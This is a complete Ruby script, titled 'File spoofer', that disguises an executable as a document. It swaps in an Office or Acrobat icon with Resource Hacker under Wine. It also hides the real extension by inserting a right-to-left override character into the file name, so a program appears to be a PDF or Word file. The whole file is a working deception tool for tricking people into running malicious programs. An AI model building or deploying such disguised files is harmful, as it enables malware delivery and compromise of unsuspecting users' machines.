#!/usr/bin/env ruby
# mind1355[at]gmail[dot]com
# File spoofer
require 'optparse'

options = {}

OptionParser.new do |opts|
  opts.banner = "Usage: change_icon.rb [options]"

  opts.on("-i", "--in input", "input file") do |input|
    options[:input] = input
  end

  opts.on("-o", "--out output", "output file") do |output|
    options[:output] = output
  end

  opts.on("-e", "--ext flash,pdf,xlsx,ppt,pptx-blue,pptx-green,pptx-orange,doc,docx", "file extension") do |ext|
    options[:ext] = ext
  end

  opts.on("-s", "--spoof", "spoof file extension") do
    options[:spoof] = true
  end

end.parse!

p options
p ARGV

case options[:ext]
when 'pdf'
  options[:icon] = "acrobat.ico"
  options[:spoof_ext] = "pdf"
when 'xlsx'
  options[:icon] = "Microsoft-Excel.ico"
  options[:spoof_ext] = "xlsx"
when 'doc'
  options[:icon] = "Microsost-Word-2013.ico"
  options[:spoof_ext] = "docx"
when 'docx'
  options[:icon] = "Microsoft-Word-2016.ico"
  options[:spoof_ext] = "docx"
when 'ppt'
  options[:icon] = "powerpoint.ico"
  options[:spoof_ext] = "ppt"
when 'pptx'
  options[:icon] = "PowerPoint-orange.ico"
  options[:spoof_ext] = "pptx"
else
  puts "[!] Extension not supported"
end

if options[:spoof]
  filename, extension = options[:output].split('.') 
  options[:output] = filename + "\u202E" + options[:spoof_ext].reverse! + "." + extension
end

if options[:output] && options[:input] && options[:icon]
  exec "wine '#{Dir.home}/.wine/drive_c/Program Files (x86)/Resource Hacker/ResourceHacker.exe' -open #{options[:input]} -save #{options[:output]} -action addskip -res #{options[:icon]} -mask 'ICONGROUP,MAINICON,'"
end
